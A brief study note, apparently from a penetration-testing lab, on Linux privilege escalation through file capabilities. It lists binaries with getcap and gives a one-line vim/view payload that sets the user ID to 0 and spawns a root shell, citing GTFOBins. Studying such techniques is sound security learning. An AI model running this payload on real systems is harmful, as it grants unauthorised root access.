Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level.
if simple user want to run a program but not have sudo permission so administrator change the tool permissions.

- Capabilities divide root user permission into small distnic unit which can independently granted.
==> Privilges user have id 0
==> Non-Privilges user have id other then 0

we can use `getcap` to list capabilities

```
getcap -r / 2>/dev/null
```

![](Pasted%20image%2020250702232537.png)

vim and its copy have not set suid bit binary.

![](Pasted%20image%2020250702232704.png)

For view 

```
/home/user/view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
We notice that vim can be used with the following command and payload:  
  
![](https://i.imgur.com/nlpCMWj.png)  

![](https://i.imgur.com/jCjvgo3.png)

